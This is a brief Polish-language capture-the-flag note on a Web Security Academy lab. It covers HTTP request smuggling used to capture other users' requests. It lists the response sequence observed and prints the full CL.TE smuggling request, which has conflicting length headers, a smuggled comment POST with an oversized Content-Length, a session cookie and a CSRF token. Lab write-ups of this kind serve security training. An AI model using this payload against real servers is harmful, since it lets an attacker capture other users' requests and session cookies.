http request smuggling Capture other

przepchnięte zwykłym requestem i wysłany request z payloadem 2 razy 

payload request 200, drugi 302 (zwykly), payload request x2 500 -> po 500 był comment z wszystkim co trzeba

 

 

POST / HTTP/1.1
Host: 0ace007c0328f6658070308a0005006d.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 247
Transfer-Encoding: chunked

 

0

 

POST /post/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 930
Cookie: session=S3l7JD1DNH2tARRUDoISpWobMcbhBJnV

 

csrf=AcOGAkK0AVohlTLKCyt685jMOJjjVSnw&postId=9&name=CARLOS&email=k%40k.pl&website=&comment=

<img width="1377" height="611" alt="image" src="https://github.com/user-attachments/assets/434ea876-bf59-49c6-960b-182ba8de3e23" />
